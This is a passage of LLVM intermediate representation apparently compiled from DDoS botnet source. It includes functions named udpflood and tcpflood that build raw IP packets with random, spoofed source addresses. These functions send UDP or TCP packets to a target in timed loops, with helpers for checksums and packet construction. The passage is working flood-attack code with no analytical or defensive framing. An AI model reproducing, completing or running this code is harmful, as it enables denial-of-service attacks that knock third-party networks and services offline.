  store i32 24, i32* %7, align 4
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call noalias i8* @malloc(i64 %26) #6
  %28 = bitcast i8* %27 to i16*
  store i16* %28, i16** %8, align 8
  %29 = load i16*, i16** %8, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* %31, i64 24, i32 1, i1 false)
  %32 = load i16*, i16** %8, align 8
  %33 = bitcast i16* %32 to i8*
  %34 = getelementptr inbounds i8, i8* %33, i64 24
  %35 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %36 = bitcast %struct.tcphdr* %35 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* %36, i64 20, i32 1, i1 false)
  %37 = load i16*, i16** %8, align 8
  %38 = load i32, i32* %7, align 4
  %39 = call zeroext i16 @csum(i16* %37, i32 %38)
  store i16 %39, i16* %9, align 2
  %40 = load i16*, i16** %8, align 8
  %41 = bitcast i16* %40 to i8*
  call void @free(i8* %41) #6
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %23, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  br i1 %11, label %21, label %12

; <label>:12:                                     ; preds = %3
  %13 = load i8*, i8** %2, align 8
  %14 = load i8*, i8** %2, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = sub i64 %15, 1
  %17 = getelementptr inbounds i8, i8* %13, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 10
  br label %21

; <label>:21:                                     ; preds = %12, %3
  %22 = phi i1 [ true, %3 ], [ %20, %12 ]
  br i1 %22, label %23, label %29

; <label>:23:                                     ; preds = %21
  %24 = load i8*, i8** %2, align 8
  %25 = load i8*, i8** %2, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = sub i64 %26, 1
  %28 = getelementptr inbounds i8, i8* %24, i64 %27
  store i8 0, i8* %28, align 1
  br label %3

; <label>:29:                                     ; preds = %21
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #6
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 %18, i32 1, i1 false)
  %19 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %4, align 8
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %39

; <label>:21:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  br label %22

; <label>:22:                                     ; preds = %35, %21
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* %2, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %22
  %27 = call i32 @rand() #6
  %28 = srem i32 %27, 26
  %29 = add nsw i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %1, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %3, align 4
  br label %22

; <label>:38:                                     ; preds = %22
  br label %68

; <label>:39:                                     ; preds = %0
  %40 = call i32 @rand() #6
  %41 = call i32 @rand() #6
  %42 = mul nsw i32 %40, %41
  %43 = srem i32 %42, 45402
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  store i32 0, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %53, %39
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %6, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %56

; <label>:49:                                     ; preds = %45
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %52 = call i8* @fgets(i8* %50, i32 1024, %struct._IO_FILE* %51)
  br label %53

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %3, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %3, align 4
  br label %45

; <label>:56:                                     ; preds = %45
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 1024, i32 16, i1 false)
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %59 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %60 = call i8* @fgets(i8* %58, i32 1024, %struct._IO_FILE* %59)
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @filter(i8* %61)
  %62 = load i8*, i8** %1, align 8
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %64 = load i32, i32* %2, align 4
  %65 = sext i32 %64 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %62, i8* %63, i64 %65, i32 1, i1 false)
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %67 = call i32 @fclose(%struct._IO_FILE* %66)
  br label %68

; <label>:68:                                     ; preds = %56, %38
  %69 = load i8*, i8** %1, align 8
  ret i8* %69
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #5

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #5

declare i32 @fclose(%struct._IO_FILE*) #5

; Function Attrs: noinline nounwind uwtable
define void @udpflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.udphdr*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 10, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = load i32, i32* %6, align 4
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %33

; <label>:29:                                     ; preds = %4
  %30 = call i32 @rand_cmwc()
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  br label %38

; <label>:33:                                     ; preds = %4
  %34 = load i32, i32* %6, align 4
  %35 = trunc i32 %34 to i16
  %36 = call zeroext i16 @htons(i16 zeroext %35) #9
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  br label %38

; <label>:38:                                     ; preds = %33, %29
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %41 = call i32 @getHost(i8* %39, %struct.in_addr* %40)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %38
  br label %257

; <label>:44:                                     ; preds = %38
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %12, align 4
  %48 = load i32, i32* %10, align 4
  %49 = icmp eq i32 %48, 32
  br i1 %49, label %50, label %103

; <label>:50:                                     ; preds = %44
  %51 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %13, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %55, label %54

; <label>:54:                                     ; preds = %50
  br label %257

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %8, align 4
  %57 = add nsw i32 %56, 1
  %58 = sext i32 %57 to i64
  %59 = call noalias i8* @malloc(i64 %58) #6
  store i8* %59, i8** %14, align 8
  %60 = load i8*, i8** %14, align 8
  %61 = icmp eq i8* %60, null
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %55
  br label %257

; <label>:63:                                     ; preds = %55
  %64 = load i8*, i8** %14, align 8
  %65 = load i32, i32* %8, align 4
  %66 = add nsw i32 %65, 1
  %67 = sext i32 %66 to i64
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 %67, i32 1, i1 false)
  %68 = load i8*, i8** %14, align 8
  %69 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %68, i32 %69)
  %70 = call i64 @time(i64* null) #6
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = add nsw i64 %70, %72
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %15, align 4
  store i32 0, i32* %16, align 4
  br label %75

; <label>:75:                                     ; preds = %99, %98, %63
  %76 = load i32, i32* %13, align 4
  %77 = load i8*, i8** %14, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %81 = call i64 @sendto(i32 %76, i8* %77, i64 %79, i32 0, %struct.sockaddr* %80, i32 16)
  %82 = load i32, i32* %16, align 4
  %83 = load i32, i32* %12, align 4
  %84 = icmp eq i32 %82, %83
  br i1 %84, label %85, label %99

; <label>:85:                                     ; preds = %75
  %86 = load i32, i32* %6, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %92

; <label>:88:                                     ; preds = %85
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %90, i16* %91, align 2
  br label %92

; <label>:92:                                     ; preds = %88, %85
  %93 = call i64 @time(i64* null) #6
  %94 = load i32, i32* %15, align 4
  %95 = sext i32 %94 to i64
  %96 = icmp sgt i64 %93, %95
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %92
  br label %102

; <label>:98:                                     ; preds = %92
  store i32 0, i32* %16, align 4
  br label %75

; <label>:99:                                     ; preds = %75
  %100 = load i32, i32* %16, align 4
  %101 = add i32 %100, 1
  store i32 %101, i32* %16, align 4
  br label %75

; <label>:102:                                    ; preds = %97
  br label %257

; <label>:103:                                    ; preds = %44
  %104 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %104, i32* %17, align 4
  %105 = load i32, i32* %17, align 4
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %108, label %107

; <label>:107:                                    ; preds = %103
  br label %257

; <label>:108:                                    ; preds = %103
  store i32 1, i32* %18, align 4
  %109 = load i32, i32* %17, align 4
  %110 = bitcast i32* %18 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #6
  %112 = icmp slt i32 %111, 0
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %108
  br label %257

; <label>:114:                                    ; preds = %108
  store i32 50, i32* %19, align 4
  br label %115

; <label>:115:                                    ; preds = %119, %114
  %116 = load i32, i32* %19, align 4
  %117 = add nsw i32 %116, -1
  store i32 %117, i32* %19, align 4
  %118 = icmp ne i32 %116, 0
  br i1 %118, label %119, label %126

; <label>:119:                                    ; preds = %115
  %120 = call i64 @time(i64* null) #6
  %121 = call i32 @rand_cmwc()
  %122 = zext i32 %121 to i64
  %123 = xor i64 %120, %122
  %124 = trunc i64 %123 to i32
  call void @srand(i32 %124) #6
  %125 = call i32 @rand() #6
  call void @init_rand(i32 %125)
  br label %115

; <label>:126:                                    ; preds = %115
  %127 = load i32, i32* %10, align 4
  %128 = icmp eq i32 %127, 0
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %126
  store i32 0, i32* %20, align 4
  br label %136

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* %10, align 4
  %132 = sub nsw i32 32, %131
  %133 = shl i32 1, %132
  %134 = sub nsw i32 %133, 1
  %135 = xor i32 %134, -1
  store i32 %135, i32* %20, align 4
  br label %136

; <label>:136:                                    ; preds = %130, %129
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %139 = add i64 28, %138
  %140 = call i8* @llvm.stacksave()
  store i8* %140, i8** %21, align 8
  %141 = alloca i8, i64 %139, align 16
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %22, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = getelementptr i8, i8* %144, i64 20
  %146 = bitcast i8* %145 to %struct.udphdr*
  store %struct.udphdr* %146, %struct.udphdr** %23, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %149 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %148, i32 0, i32 0
  %150 = load i32, i32* %149, align 4
  %151 = load i32, i32* %20, align 4
  %152 = call i32 @getRandomIP(i32 %151)
  %153 = call i32 @htonl(i32 %152) #9
  %154 = load i32, i32* %8, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 8, %155
  %157 = trunc i64 %156 to i32
  call void @makeIPPacket(%struct.iphdr* %147, i32 %150, i32 %153, i8 zeroext 17, i32 %157)
  %158 = load i32, i32* %8, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 8, %159
  %161 = trunc i64 %160 to i16
  %162 = call zeroext i16 @htons(i16 zeroext %161) #9
  %163 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 2
  store i16 %162, i16* %164, align 2
  %165 = call i32 @rand_cmwc()
  %166 = trunc i32 %165 to i16
  %167 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  store i16 %166, i16* %168, align 2
  %169 = load i32, i32* %6, align 4
  %170 = icmp eq i32 %169, 0
  br i1 %170, label %171, label %173

; <label>:171:                                    ; preds = %136
  %172 = call i32 @rand_cmwc()
  br label %178

; <label>:173:                                    ; preds = %136
  %174 = load i32, i32* %6, align 4
  %175 = trunc i32 %174 to i16
  %176 = call zeroext i16 @htons(i16 zeroext %175) #9
  %177 = zext i16 %176 to i32
  br label %178

; <label>:178:                                    ; preds = %173, %171
  %179 = phi i32 [ %172, %171 ], [ %177, %173 ]
  %180 = trunc i32 %179 to i16
  %181 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %182 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 3
  store i16 0, i16* %184, align 2
  %185 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %186 = bitcast %struct.udphdr* %185 to i8*
  %187 = getelementptr inbounds i8, i8* %186, i64 8
  %188 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %187, i32 %188)
  %189 = bitcast i8* %141 to i16*
  %190 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  %192 = load i16, i16* %191, align 2
  %193 = zext i16 %192 to i32
  %194 = call zeroext i16 @csum(i16* %189, i32 %193)
  %195 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 7
  store i16 %194, i16* %196, align 2
  %197 = call i64 @time(i64* null) #6
  %198 = load i32, i32* %7, align 4
  %199 = sext i32 %198 to i64
  %200 = add nsw i64 %197, %199
  %201 = trunc i64 %200 to i32
  store i32 %201, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %202

; <label>:202:                                    ; preds = %252, %251, %178
  br label %203

; <label>:203:                                    ; preds = %202
  %204 = load i32, i32* %17, align 4
  %205 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %206 = call i64 @sendto(i32 %204, i8* %141, i64 %139, i32 0, %struct.sockaddr* %205, i32 16)
  %207 = call i32 @rand_cmwc()
  %208 = trunc i32 %207 to i16
  %209 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 0
  store i16 %208, i16* %210, align 2
  %211 = load i32, i32* %6, align 4
  %212 = icmp eq i32 %211, 0
  br i1 %212, label %213, label %215

; <label>:213:                                    ; preds = %203
  %214 = call i32 @rand_cmwc()
  br label %220

; <label>:215:                                    ; preds = %203
  %216 = load i32, i32* %6, align 4
  %217 = trunc i32 %216 to i16
  %218 = call zeroext i16 @htons(i16 zeroext %217) #9
  %219 = zext i16 %218 to i32
  br label %220

; <label>:220:                                    ; preds = %215, %213
  %221 = phi i32 [ %214, %213 ], [ %219, %215 ]
  %222 = trunc i32 %221 to i16
  %223 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %224 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %223, i32 0, i32 1
  store i16 %222, i16* %224, align 2
  %225 = call i32 @rand_cmwc()
  %226 = trunc i32 %225 to i16
  %227 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 3
  store i16 %226, i16* %228, align 4
  %229 = load i32, i32* %20, align 4
  %230 = call i32 @getRandomIP(i32 %229)
  %231 = call i32 @htonl(i32 %230) #9
  %232 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 8
  store i32 %231, i32* %233, align 4
  %234 = bitcast i8* %141 to i16*
  %235 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 2
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = call zeroext i16 @csum(i16* %234, i32 %238)
  %240 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 7
  store i16 %239, i16* %241, align 2
  %242 = load i32, i32* %25, align 4
  %243 = load i32, i32* %12, align 4
  %244 = icmp eq i32 %242, %243
  br i1 %244, label %245, label %252

; <label>:245:                                    ; preds = %220
  %246 = call i64 @time(i64* null) #6
  %247 = load i32, i32* %24, align 4
  %248 = sext i32 %247 to i64
  %249 = icmp sgt i64 %246, %248
  br i1 %249, label %250, label %251

; <label>:250:                                    ; preds = %245
  br label %255

; <label>:251:                                    ; preds = %245
  store i32 0, i32* %25, align 4
  br label %202

; <label>:252:                                    ; preds = %220
  %253 = load i32, i32* %25, align 4
  %254 = add i32 %253, 1
  store i32 %254, i32* %25, align 4
  br label %202

; <label>:255:                                    ; preds = %250
  %256 = load i8*, i8** %21, align 8
  call void @llvm.stackrestore(i8* %256)
  br label %257

; <label>:257:                                    ; preds = %255, %113, %107, %102, %62, %54, %43
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @tcpflood(i8*, i32, i32, i32, i8*) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i8* %4, i8** %10, align 8
  store i32 32, i32* %11, align 4
  store i32 10, i32* %12, align 4
  %24 = load i32, i32* %12, align 4
  store i32 %24, i32* %13, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %7, align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %32

; <label>:28:                                     ; preds = %5
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  br label %37

; <label>:32:                                     ; preds = %5
  %33 = load i32, i32* %7, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #9
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  br label %37

; <label>:37:                                     ; preds = %32, %28
  %38 = load i8*, i8** %6, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  br label %335

; <label>:43:                                     ; preds = %37
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %45 = getelementptr inbounds [8 x i8], [8 x i8]* %44, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 8, i32 4, i1 false)
  %46 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %43
  br label %335

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #6
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %335

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %11, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %56
  store i32 0, i32* %17, align 4
